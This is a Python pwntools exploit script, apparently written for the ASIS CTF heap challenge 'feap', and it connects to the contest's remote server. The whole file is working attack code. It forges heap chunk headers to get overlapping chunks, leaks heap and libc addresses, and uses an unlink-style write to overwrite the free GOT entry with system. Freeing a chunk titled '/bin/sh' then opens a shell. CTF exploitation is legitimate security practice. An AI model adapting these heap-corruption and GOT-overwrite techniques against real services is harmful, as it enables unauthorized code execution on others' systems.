from pwn import *

# p = process("./feap")
p = remote('feap.asis-ctf.ir', 7331)

def menu():
	p.recvuntil('> ')

def create(body_size, title, body):
	menu()
	p.sendline('1')
	
	p.recvuntil(': ')
	p.sendline(str(body_size))

	p.recvuntil(': ')
	p.send(title)

	p.recvuntil(': ')
	if len(body) > 0:
		p.send(body)

# 0xa0 - 0x40 = 0x60 (96)

# 1 title 2 body
def edit(noo, opt, content):
	menu()
	p.sendline('3')

	p.recvuntil(': ')
	p.sendline(str(noo))

	p.recvuntil(': ')
	p.sendline(str(opt))

	p.recvuntil(': ')
	p.send(content)

def delete(noo):
	menu()
	p.sendline('2')

	p.recvuntil(': ')
	p.sendline(str(noo))


create(0x40, '/bin/sh\x00\n', 'A\n') # 0
create(0x60 + 0x20, 'B\n', 'B\n') # 1
create(0x60, 'C\n', 'C\n') # 2
create(0x80, 'D\n', 'D\n') # 3
create(0x150 - 0x40, 'D\n', 'D\n') # 4
create(0x80, 'D\n', 'D\n') # 5

delete(4)
create(0x60, 'E\n', 'E\n') # 4
create(0x100, 'F\n', 'F\n') # 6

edit(0, 2, 'A' * 64 + p64(0) + p64(0xb0 + 0x20 + 0xb0 + 0x1) + '\n')
delete(1)
create(0x80, 'E\n', 'E\n') # 1
create(0x100, 'E\n', 'E\n') # 7
create(0x100, 'E\n', 'E\n') # 8

menu()
p.sendline('5')
p.recvuntil(': ')
p.sendline('2')
p.recvuntil('Title: ')
leak_addr = p.recvuntil('\n', drop=True)
leak_addr = u64(leak_addr + '\x00' * (8 - len(leak_addr)))

heap_base = leak_addr - 0x4f0
print 'heap base: %s' % hex(heap_base)

# gdb.attach(p)

loc = heap_base + 0x40

edit(6, 1, p64(0) + p64(0x141) + p64(loc - 0x18) + p64(loc - 0x10) + '\n')
edit(6, 2, 'A' * 0x100 + p64(0x140) + p64(0x150) + '\n')

delete(7)

free_got = 0x602018
edit(6, 1, p64(free_got) + '\n')

menu()
p.sendline('5')
p.recvuntil(': ')
p.sendline('3')
p.recvuntil('Title: ')
leak_addr = p.recvuntil('\n', drop=True)
leak_addr = u64(leak_addr + '\x00' * (8 - len(leak_addr)))

print 'leak_addr: %s' % hex(leak_addr)

# raw_input('wait')

libc_base = leak_addr - 0x82df0 # 0x847f0
system = libc_base + 0x46640 # 0x443d0
puts = libc_base + 0x6fe30 # 0x709d0

edit(3, 1, p64(system) + p64(puts) + '\n')

delete(0)
# gdb.attach(p)

'''
create(0x0, 'keen\n', '') # 0
create(0x0, 'keen\n', '') # 1
create(0x0, 'keen\n', '') # 2

delete(1)

gdb.attach(p)

create(0x0, 'k33n\n', '') # 3
create(0x0, 'AAAA\n', '') # 3
'''

# delete(4)
# create(0x60, 'E\n', 'E\n') # 1

# gdb.attach(p)

p.interactive()


